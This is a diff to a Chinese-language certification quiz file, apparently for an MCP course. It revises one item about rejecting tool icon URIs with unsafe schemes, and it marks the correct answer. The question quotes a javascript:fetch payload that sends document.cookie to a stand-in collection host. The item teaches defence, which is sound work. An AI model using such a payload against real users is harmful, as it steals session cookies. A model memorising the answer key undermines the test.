@@ -789,7 +789,7 @@
       "prompt": "安全负责人审查新服务器时发现，某工具的 icons 条目把 src 设为 javascript:fetch('https://collect.example/'+document.cookie)。渲染图标的客户端必须如何处理？",
       "type": "single",
       "options": [
-        "拒绝该图标，因为图标 URI 必须使用 HTTPS 或 data:，javascript: 等不安全方案必须拒绝",
+        "拒绝该图标，因为 javascript: 属于可执行的不可信 URI；只从可信来源加载并安全处理图标",
         "渲染该图标，因为图标只是装饰性元数据，绝不会在 host 界面中执行",
         "仅在模型确认图标符合工具声明用途后渲染",
         "自动把 javascript: 改写为 https:，再获取新地址"
@@ -797,7 +797,7 @@
       "correct": [
         0
       ],
-      "explanation": "图标元数据是不可信的服务器输入。规范要求使用方只接受 HTTPS 或 data: 图标 URI，拒绝 javascript: 等不安全方案和重定向，并把 SVG 等获取到的载荷视为可能执行代码。改写方案或询问模型，都不能让攻击者控制的 URI 变得安全。",
+      "explanation": "图标元数据是不可信的服务器输入。Icon.src 可使用标准 URI（包括 HTTP、HTTPS 或 data:）；使用方应限制为可信来源、拒绝 javascript: 等可执行方案，并安全处理 SVG 等载荷。改写方案或询问模型，都不能让攻击者控制的 URI 变得安全。",
       "references": [
         "certifications/mcpa/lessons/22-trust-boundaries",
         "certifications/mcpa/lessons/26-risk-and-safety-controls"
